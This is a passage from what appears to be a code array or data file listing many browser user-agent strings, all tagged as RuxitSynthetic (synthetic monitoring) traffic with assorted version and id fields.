            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8363179569702398550 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904546298 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904548940 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7082771384649959318 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v5352527706787539266 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898911474 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904557619 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v1191230962398884679 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6220202203618526389 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v8232184438743515897 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3452902151292110692 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v1884175495302863172 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v1878078504752048899 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904568276 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904570112 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898966546 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904572750 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7911831622657866944 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v1338962847539525756 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904580780 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8948183397545125808 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904591442 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v7250160594334663388 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904593274 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899046209 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904595915 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3294195843553327004 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8882944867967115598 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3044973005177577410 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3671361512141524032 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904604600 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v472759525628011434 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899101270 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6653718737126585870 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904615265 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1398902216522761430 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904617099 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904619740 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8308744051586227681 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2104077989550976865 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904628425 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v1825000816890638155 t8161287340496183299 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899183652 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v7637398120841371787 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1060657732924710082 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904639086 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904640921 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v545198177521095375 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904643563 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v4135616003141161694 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899238720 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v9095282538478086916 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904652238 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v7259297586245306081 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v4253335595049415635 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904662903 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904664739 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904667380 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v822944776303306816 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v6557187509727231733 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899321111 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904676061 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v852407386824820666 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6972802263503675844 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v2757371636918366509 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v2062223211435327975 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v5250227466399487821 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7471036990888392766 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904686720 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904688556 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899376187 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904691195 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v1024176440451421706 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7810387977748814949 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904699225 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3164849149611347402 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904709892 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v6021756440253583794 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904711723 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899455841 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904714362 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8402462977442048910 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v749746722490575963 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v1609522332184699547 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v7197836170393726965 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904723048 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6144521573965615228 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899510909 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8758712460149416772 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904733709 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v472656589849896811 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904735545 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904738183 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5480762787964269851 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v784181597199622708 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904746866 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899593287 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v1663442213841837483 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v7108519976679513285 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904757528 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904759364 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1271936617857723094 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904762005 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v545028037977523205 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899629249 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899648352 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4844450563156034652 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904770685 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v9019639045423859851 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904781351 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8605463947855577575 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904783187 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904785829 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2126647309757511642 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v5952712165472709018 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11899730746 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904794508 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v7461863214313459006 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6225257239320380212 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
